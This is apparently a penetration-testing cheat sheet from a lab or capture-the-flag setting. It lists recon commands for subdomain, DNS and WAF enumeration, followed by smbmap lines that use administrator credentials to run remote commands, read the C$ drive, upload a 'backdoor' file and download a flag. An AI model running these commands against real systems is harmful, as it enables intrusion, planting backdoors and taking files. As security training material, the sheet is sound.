# TOOLS
## 1. Enumeration
- __```netdiscover -I eth0 -r <ip>/24```___
- __```sublist3r -d <domain name>``` or ```sublist3r -d <domain name> -e google,yahoo```  Subdomain Enumeration__
- __```dnsenum <domain name>```__
- __```dnsrecon -d <domain_name>```__
- __```whatweb <ip>```__
- __```httracker <url>```__
- __```wafw00f <domain_name>``` or ```wafw00f <domain_name> -a```__
- __```theHarvester -d <domain name> -b google,linkedin,yahoo,dnsdumpster,duckduckgo,crtsh,rapdiddns```__
- __```dnsenum <domain name>```__
- __```dig axfr @<nameServer> <domain name>```__
- __```fierce -dns <domain name>```__

## 2. [Nmap](nmap.md)

## 3. SMB
- __```net use z: \\10.5.19.82\c$ smbserver_771 /user:administrator```__
- ##### SMBMap
- `smbmap -u guest -p "" -d . -H 10.0.1.22`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -x "ipconfig"`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -L`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -r 'C$'` ---> reads the content of the 'C' drive
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 --upload '/root/backdoor' 'C$\backdoor'`
  - `--upload '/root/backdoor'`---> upload the backdoor file 
  - `'C$\backdoor'`  ---> giving the path to where to upload the backdoor file in target system 
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 --download "C$\flag.txt"`
